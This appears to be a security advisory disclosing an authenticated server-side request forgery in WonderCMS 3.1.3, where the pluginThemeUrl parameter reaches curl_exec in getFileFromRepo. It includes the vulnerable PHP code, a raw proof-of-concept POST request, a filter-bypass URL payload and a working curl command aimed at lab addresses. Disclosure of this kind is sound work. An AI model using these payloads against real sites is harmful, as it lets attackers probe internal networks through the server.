# SSRF vulnerability in `getFileFromRepo` Function of `index.php` File (WonderCMS 3.1.3 version)

## 0x01 Affected version

vendor: https://github.com/WonderCMS/

version: 3.1.3

php version: 7.x

## 0x02 Vulnerability description

A Server-Side Request Forgery (SSRF) in `getFileFromRepo` function of WonderCMS 3.1.3 allows remote attackers to force the application to make arbitrary requests via injection of arbitrary URLs into the `pluginThemeUrl` parameter. We should note that the vulnable parameter for this vulnerability is different from the [CVE-2020-35313](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35313) vulnerability and that the vulnerability requires authentication to trigger.



The vulnerable code is located in the `getFileFromRepo()` function in the `index.php` file. Because the function `addCustomThemePluginRepository()` does not perform sufficient checksumming on the `pluginThemeUrl` parameter, the taint is introduced from the `$url` variable into the tainted function `curl_exec` called by `getFileFromRepo()` at the file `index.php`, and after the `curl_exec` function is executed it sends a request to the URL specified by the `pluginThemeUrl` parameter, eventually leading to an SSRF vulnerability.



Function call stack information related to the SSRF vulnerability.

```
Wcms->getFileFromRepo (/var/www/html/wondercms/index.php:736)
Wcms->getCheckFileFromRepo (/var/www/html/wondercms/index.php:763)
Wcms->getOfficialVersion (/var/www/html/wondercms/index.php:752)
Wcms->checkBranch (/var/www/html/wondercms/index.php:998)
Wcms->downloadThemePluginsData (/var/www/html/wondercms/index.php:961)
Wcms->cacheSingleCacheThemePluginData (/var/www/html/wondercms/index.php:942)
Wcms->addCustomThemePluginRepository (/var/www/html/wondercms/index.php:1032)
Wcms->init (/var/www/html/wondercms/index.php:129)
{main} (/var/www/html/wondercms/index.php:15)
```



Code for the location of the tainted inflow

```php
	public function addCustomThemePluginRepository(): void
	{
		if (!isset($_POST['pluginThemeUrl'], $_POST['pluginThemeType']) || !$this->verifyFormActions()) {
			return;
		}
		$type = $_POST['pluginThemeType'];
		$url = rtrim(trim($_POST['pluginThemeUrl']), '/');
		...
		}
```



The location of the code that ultimately triggers the vulnerability

```php
	public function getFileFromRepo(string $file, string $repo = self::WCMS_REPO): string
	{
		$repo = str_replace('https://github.com/', 'https://raw.githubusercontent.com/', $repo);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_URL, $repo . $file);
		$content = curl_exec($ch);
		if (false === $content) {
			$this->alert('danger', 'Cannot get content from repository.');
		}
		curl_close($ch);

		return (string)$content;
	}
```



Because the `pluginThemeUrl` parameter is unrestricted, it is also possible to use the server side to send requests, such as probing intranet web services. The corresponding PoC is as follows:

```
POST /wondercms/home HTTP/1.1
Host: 172.16.119.147
Content-Length: 175
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.119.147
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.16.119.147/wondercms/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vf6nfrjfsvu27nnf1cf4tnjjji
x-custom-ip-authorization: 127.0.0.1
Connection: close

pluginThemeUrl=http%3A%2F%2F172.16.119.1%2Ftets%23https%3A%2F%2Fgithub.com%2Ffuzz&token=a3926e0b25ea9c109c32e1f013a571b51190214bdf2dd848d04f314214af2812&pluginThemeType=themes
```



This also shows that the security filtering functions currently used are incomplete. An attacker can easily bypass it by using the following payload.

```
http%3A%2F%2F172.16.119.1%2Ftets%23https%3A%2F%2Fgithub.com%2Ffuzz
```



Examples of triggered vulnerabilities

![image-20230721161928260](./assets/image-20230721161928260.png)



You can also use the following curl command to verify the vulnerability. (Note that you need to update the token information for authentication.)

```
curl -i -s -k -X $'POST' \
    -H $'Host: 172.16.119.147' -H $'Content-Length: 178' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://172.16.119.147' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://172.16.119.147/wondercms/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: zh-CN,zh;q=0.9' -H $'x-custom-ip-authorization: 127.0.0.1' -H $'Connection: close' \
    -b $'54e7d701daf706e028b5135c2ab6049b=svkasl680me62m9o8eh5ika81j; PHPSESSID=g037p4hm9mli76vcg5pekn8ge2' \
    --data-binary $'pluginThemeUrl=http%3A%2F%2F172.16.119.1%2Fflag123%23https%3A%2F%2Fgithub.com%2Ffuzz&token=8155deece02eacb5ae097e159b53bfb3b19ee06545da3d784912d0499169181f&pluginThemeType=themes' \
    $'http://172.16.119.147/wondercms/home'
```



## 0x03 Acknowledgement

z3